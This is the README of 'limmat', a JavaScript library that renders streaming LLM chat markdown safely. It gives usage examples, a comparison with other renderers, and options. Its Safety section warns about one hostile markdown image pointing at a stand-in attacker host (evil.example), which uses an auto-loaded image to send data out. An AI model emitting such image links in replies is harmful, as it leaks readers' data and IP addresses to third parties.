# limmat

Streaming markdown for LLM chat. Half-typed syntax like `[docs](https://example` or `# Titl` renders cleanly instead of showing raw text.

<p align="center">
  <a href="https://limmat.daanrosendal.com">
    <picture>
      <source media="(prefers-color-scheme: dark)" srcset="https://limmat.daanrosendal.com/demo-dark.gif">
      <img src="https://limmat.daanrosendal.com/demo-light.gif" width="720" alt="The limmat demo streaming a reply about itself: the raw text from the model on the left, limmat's rendered output on the right.">
    </picture>
  </a>
</p>

**[Try the demo](https://limmat.daanrosendal.com)** or `npm install limmat`

- **No raw markers.** Unfinished markdown shows as clean text until it is complete.
- **Predictable.** However the text is cut into chunks, the page ends up the same as rendering it all at once.
- **Safe.** It builds DOM nodes, never HTML strings, so hostile text stays text. Remote images load by default, so limit them with `images` (see [Safety](#safety)).
- **Any framework.** Give it any DOM element: React, Vue, Svelte, Angular, or plain JavaScript. It needs a DOM, so it runs in the browser.
- **Small and fast.** 10.5 kB gzip, no dependencies ([how it compares](#how-it-compares)). A 100 KB reply streamed in small chunks takes about 20 ms in total in Chromium.

## Install and usage

```sh
npm install limmat
```

```ts
import { createRenderer } from 'limmat';
import 'limmat/style.css'; // optional

const md = createRenderer(document.querySelector('#answer')!);
for await (const chunk of stream) md.write(chunk); // any source of text chunks
md.end();
```

`createRenderer(el)` returns `write(chunk)` (only the new text), `end()` (when the stream is over), `reset()` (clear it and start over), and `destroy()`. Use one renderer per message. It empties the element, and options are read once, at creation. To show a finished message, call `md.write(text)` and then `md.end()`. The optional `limmat/style.css` uses CSS variables such as `--limmat-link` and `--limmat-code-bg`.

<details>
<summary>Use it in React, Vue, Svelte, or Angular</summary>

Create the renderer when the component mounts and destroy it when it unmounts. Each example reads `chat(signal)`, your own async iterable of text chunks.

<details>
<summary>React</summary>

```tsx
import { useEffect, useRef } from 'react';
import { createRenderer } from 'limmat';
import { chat } from './chat'; // your async iterable of text chunks

export function Message() {
  const ref = useRef<HTMLDivElement>(null);
  useEffect(() => {
    const md = createRenderer(ref.current!);
    const ctrl = new AbortController();
    (async () => {
      for await (const chunk of chat(ctrl.signal)) md.write(chunk);
      md.end();
    })().catch((e) => {
      if (!ctrl.signal.aborted) console.error(e);
    });
    return () => {
      ctrl.abort();
      md.destroy();
    };
  }, []);
  return <div ref={ref} />;
}
```

</details>

<details>
<summary>Vue</summary>

```vue
<script setup lang="ts">
import { onBeforeUnmount, onMounted, useTemplateRef } from 'vue';
import { createRenderer, type Renderer } from 'limmat';
import { chat } from './chat'; // your async iterable of text chunks

const el = useTemplateRef<HTMLElement>('el');
const ctrl = new AbortController();
let md: Renderer | undefined;

onMounted(async () => {
  md = createRenderer(el.value!);
  try {
    for await (const chunk of chat(ctrl.signal)) md.write(chunk);
    md.end();
  } catch (e) {
    if (!ctrl.signal.aborted) console.error(e);
  }
});

onBeforeUnmount(() => {
  ctrl.abort();
  md?.destroy();
});
</script>

<template>
  <div ref="el"></div>
</template>
```

</details>

<details>
<summary>Svelte</summary>

```svelte
<script lang="ts">
  import { createRenderer } from 'limmat';
  import { chat } from './chat'; // your async iterable of text chunks

  let el: HTMLElement;

  $effect(() => {
    const md = createRenderer(el);
    const ctrl = new AbortController();
    (async () => {
      for await (const chunk of chat(ctrl.signal)) md.write(chunk);
      md.end();
    })().catch((e) => {
      if (!ctrl.signal.aborted) console.error(e);
    });
    return () => {
      ctrl.abort();
      md.destroy();
    };
  });
</script>

<div bind:this={el}></div>
```

</details>

<details>
<summary>Angular</summary>

```ts
import { Component, type ElementRef, type OnDestroy, afterNextRender, viewChild } from '@angular/core';
import { createRenderer, type Renderer } from 'limmat';
import { chat } from './chat'; // your async iterable of text chunks

@Component({ selector: 'app-message', template: '<div #box></div>' })
export class MessageComponent implements OnDestroy {
  private box = viewChild.required<ElementRef<HTMLElement>>('box');
  private ctrl = new AbortController();
  private md?: Renderer;

  constructor() {
    afterNextRender(async () => {
      this.md = createRenderer(this.box().nativeElement);
      try {
        for await (const chunk of chat(this.ctrl.signal)) this.md.write(chunk);
        this.md.end();
      } catch (e) {
        if (!this.ctrl.signal.aborted) console.error(e);
      }
    });
  }

  ngOnDestroy() {
    this.ctrl.abort();
    this.md?.destroy();
  }
}
```

</details>

</details>

### Colored code

Add the optional highlighter (it needs `@speed-highlight/core`, plus one of its theme stylesheets):

```ts
import { speedHighlight } from 'limmat/highlight';
createRenderer(el, { highlight: speedHighlight() });
```

## How it compares

<!-- compare:start (generated by scripts/gen-compare.mjs from benchmarks/compare/results.json and docs/compare.json, do not edit) -->
| Compared on | [limmat](https://github.com/DaanRosendal/limmat#readme) | [streaming-markdown](https://github.com/thetarnav/streaming-markdown#readme) | [Streamdown](https://github.com/vercel/streamdown#readme) | [marked](https://github.com/markedjs/marked#readme) | [react-markdown](https://github.com/remarkjs/react-markdown#readme) |
|---|---|---|---|---|---|
| No framework needed | ✅ | ✅ | ❌ React | ✅ | ❌ React |
| Runtime dependencies | ✅ 0 | ✅ 0 | ❌ 107 | ✅ 0 | ❌ 60 |
| Safe by default | ✅ | ❌ | ✅ | ❌ | ✅ |
| No raw markers while streaming | ✅ | ✅ | ❌ | ❌ | ❌ |
| CommonMark examples passed | ⚠️ 59% | ❌ 30% | ✅ 82% | ✅ 99% | ✅ 90% |
| Size (gzip) | 10.5 kB | 3.3 kB | 165.6 kB | 15.9 kB | 36.8 kB |
| Last release | Nov&nbsp;2026 | **May&nbsp;2025** | Nov&nbsp;2026 | Nov&nbsp;2026 | **Mar&nbsp;2025** |

Checked on 2026-11-21 against the latest releases, each in its default quick-start setup ([probes and raw results](https://github.com/DaanRosendal/limmat/blob/master/benchmarks/compare/README.md)). Wrong or out of date? Open an issue or pull request.

<details>
<summary>How this was measured</summary>

- Safe by default: streaming-markdown: unsafe link scheme kept; marked: script runs, unsafe link scheme kept.
- Raw markers while streaming: Streamdown 7 of 10 constructs, marked 7 of 10 constructs, and react-markdown 5 of 8 constructs. marked and react-markdown are not streaming renderers. Streamdown's leaks are brief, a lone opening marker, a half-typed table, or a link's brackets, with its remend option on as in its README.
- Remote loads: Every library loads a remote markdown image without a click. Raw HTML images also load in Streamdown and marked. limmat can turn this off with `images: false`.
- Rules: safe means no script ran and no unsafe link scheme (such as `javascript:`) was kept. The markers mark is a check for none, a warning for 1 to 3 leaked constructs, and a cross for more. CommonMark is tag structure and text on the 652 examples of spec 0.31.2, approximate, with a check over 80 percent, a warning from 50 to 80, and a cross below. Dependencies are all packages installed below the library, not counting React. Bold means more than a year ago.

Versions: limmat 0.2.0, streaming-markdown 0.2.15, Streamdown 2.8.0, marked 18.2.1, react-markdown 10.1.0. Node 25.8.2, Playwright 1.65.1, Chromium 159.0.8154.6.

- limmat 0.2.0 (master): `createRenderer(container)` with no options, `write(chunk)` for every chunk and `end()` at the end (50 ms throttle). Size: `src/index.ts`, esbuild minify, same target as `scripts/size.mjs`. ([docs](https://github.com/DaanRosendal/limmat#readme))
- streaming-markdown 0.2.15: `parser(default_renderer(container))`, `parser_write` for every chunk and `parser_end` at the end, no options. Size: quick-start import only, esbuild minify. ([docs](https://github.com/thetarnav/streaming-markdown#readme))
- Streamdown 2.8.0: `<Streamdown isAnimating={true}>` while text arrives and `isAnimating={false}` once the stream has ended, as its README shows, no plugins. Size: react and react-dom excluded; initial chunks only, lazy-loaded shiki and mermaid not counted. ([docs](https://github.com/vercel/streamdown#readme))
- marked 18.2.1: `container.innerHTML = marked.parse(text so far)` on every write, no options and no sanitizer. Size: quick-start import only, esbuild minify. ([docs](https://github.com/markedjs/marked#readme))
- react-markdown 10.1.0: `<Markdown>{text so far}</Markdown>` rendered again on every write, no plugins, default `urlTransform`. Size: react and react-dom excluded. ([docs](https://github.com/remarkjs/react-markdown#readme))

</details>
<!-- compare:end -->

## What is supported

limmat follows the [CommonMark spec](https://spec.commonmark.org/0.31.2/) where it can. Anything it does not support falls back to plain text or a simpler element, never to raw HTML.

<!-- support:start (generated by scripts/gen-support.mjs from docs/support.json, do not edit) -->
| Feature | Status | Note |
|---|---|---|
| Headings, rules, block quotes, tables, inline code, line breaks | ✅&nbsp;Supported |  |
| Code blocks (fenced) | ✅&nbsp;Supported | Language label, Copy button, optional highlighting. |
| Task lists | ✅&nbsp;Supported | Checkboxes are read-only. |
| Bold, italic, strikethrough | ✅&nbsp;Supported | `snake_case_words` stay text. Strikethrough needs two tildes. |
| Collapsible sections (`<details>`) | ✅&nbsp;Supported | Each tag alone on its line. |
| Lists | ⚠️&nbsp;Partial | Nesting works. Blank lines between items are ignored. |
| Links and bare URLs | ⚠️&nbsp;Partial | Only http, https, and mailto. Titles are dropped. Unsafe URLs show as text. |
| Images | ⚠️&nbsp;Partial | On by default and loaded without a click, so limit them with `images`. No titles. |
| Raw HTML | ⚠️&nbsp;Partial | Shown as text, except a few tags like `<kbd>` and `<sub>`. |
| Underlined headings, indented code, reference links, HTML entities, tab indentation | ❌&nbsp;Not&nbsp;yet | Shown as text or a simpler element. |
| Math, footnotes, alerts, citations, emoji codes | ❌&nbsp;Not&nbsp;yet | Shown as text or a plain block quote. Math, footnotes, and citations are planned as opt-ins. |
<!-- support:end -->

## Options

Pass options as the second argument to `createRenderer`. All are optional.

| Option | Default | What it does |
|---|---|---|
| `throttleMs` | `50` | Minimum ms between re-renders of the open block. `0` renders on every write. |
| `images` | `true` | Allowed image origins, like `['https://cdn.example.com']`, or `false` to show "Image not shown: alt text" instead. See [Safety](#safety). |
| `html` | `true` | Which safe tags become elements, like `<kbd>` and `<details>`: `true` for all, a list to keep only some, or `false` to show them as text (except `<br>`). |
| `highlight` | none | `(el, code, lang) => void`, called for each finished code block. `limmat/highlight` provides one. |
| `onLinkClick` | none | `(href, event) => boolean`. Return `true` to handle the click yourself. |
| `isInternalPath` | all paths | `(path) => boolean`. Decides which site paths like `/docs/x` become links. Check the whole path. |
| `allowedProtocols` | see description | Protocols that become links, by default `https`, `http`, `mailto`, `tel`, `irc`, `ircs`, and `xmpp`. Others show as text. A protocol you list is trusted, except `javascript`, `data`, and `vbscript`, which are always refused. |
| `externalLinksNewTab` | `true` | `false` opens links in the same tab. |
| `classPrefix` | `'limmat'` | Prefix for generated classes: letters, digits, `_`, and `-`, starting with a letter or `_`. The bundled CSS only styles the default. |
| `labels` | English | Text for the Copy button and screen readers: `copy`, `copied`, `table`, `done`, `todo`, `imageNotShown`. An empty label uses the default. |

For example:

```ts
createRenderer(el, {
  images: ['https://cdn.example.com'],
  html: ['kbd', 'sub', 'sup'], // no <details>
  highlight: speedHighlight(),
  onLinkClick: (href) => {
    if (!href.startsWith('/docs/')) return false;
    router.push(href); // your router
    return true;
  },
  labels: { copy: 'Kopieren', copied: 'Kopiert' },
});
```

## Safety

- **HTML:** limmat never writes an HTML string into the page, so it works under a strict CSP and Trusted Types. Raw HTML shows as text, except a few attribute-free tags and collapsible `<details>`.
- **Links:** only an allowed protocol (`allowedProtocols`) or a site path (`isInternalPath`) becomes a link, see [Options](#options).
- **Images:** they load without a click, so a hostile reply can embed `![](https://evil.example/?x=...)`. The request reveals the reader's IP address and carries whatever the reply put in the URL. Pass `images: ['https://your-cdn.example']` or `images: false` to limit that.
- **Highlighter:** the optional highlighter passes code to `@speed-highlight/core`, which builds HTML itself.

More in [SECURITY.md](https://github.com/DaanRosendal/limmat/blob/master/SECURITY.md).

---

Bug? [Open an issue](https://github.com/DaanRosendal/limmat/issues). Vulnerability? [SECURITY.md](https://github.com/DaanRosendal/limmat/blob/master/SECURITY.md). Contributing? [AGENTS.md](https://github.com/DaanRosendal/limmat/blob/master/AGENTS.md). Changes: [CHANGELOG.md](https://github.com/DaanRosendal/limmat/blob/master/CHANGELOG.md). Before 1.0, breaking changes can ship in minor releases. Licensed under the [MIT License](https://github.com/DaanRosendal/limmat/blob/master/LICENSE).

*Named after the [Limmat](https://en.wikipedia.org/wiki/Limmat), the river through Zurich.*
